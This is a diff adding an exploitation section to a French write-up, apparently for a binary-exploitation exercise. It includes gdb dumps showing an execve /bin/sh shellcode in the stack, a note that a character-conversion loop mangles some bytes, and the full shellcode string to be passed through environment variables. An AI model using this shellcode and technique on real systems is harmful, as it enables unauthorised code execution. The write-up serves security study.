@@ -15,6 +15,24 @@ On peut en revanche tenter de modifier la **GOT** (Global Offset Table) afin de 
 
 ### Exploitation
 
+En essayant de passer le shellcode dans le buffer avant la boucle while on s'apercoit que notre shellcode est bien present dans la stack : 
+
+```
+(gdb) x/21x $esp+0x28
+0xffffd5a8:     0x6a    0x0b    0x58    0x99    0x52    0x68    0x2f    0x2f
+0xffffd5b0:     0x73    0x68    0x68    0x2f    0x62    0x69    0x6e    0x89
+0xffffd5b8:     0xe3    0x31    0xc9    0xcd    0x80
+```
+
+Mais la transformation des char dans la boucle modifie notre shellcode est donc devient inutilisable en l'etat actuel :
+
+```
+(gdb) x/21x $esp+0x28
+0xffffd5a8:     0x6a    0x0b    0x78    0x99    0x72    0x68    0x2f    0x2f
+0xffffd5b0:     0x73    0x68    0x68    0x2f    0x62    0x69    0x6e    0x89
+0xffffd5b8:     0xe3    0x31    0xc9    0xcd    0x80
+```
+
 *Pour changer, nous allons faire passer notre Shellcode par les variables d'environnement.*
 
 Notre shellcode est le suivant: `\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80`
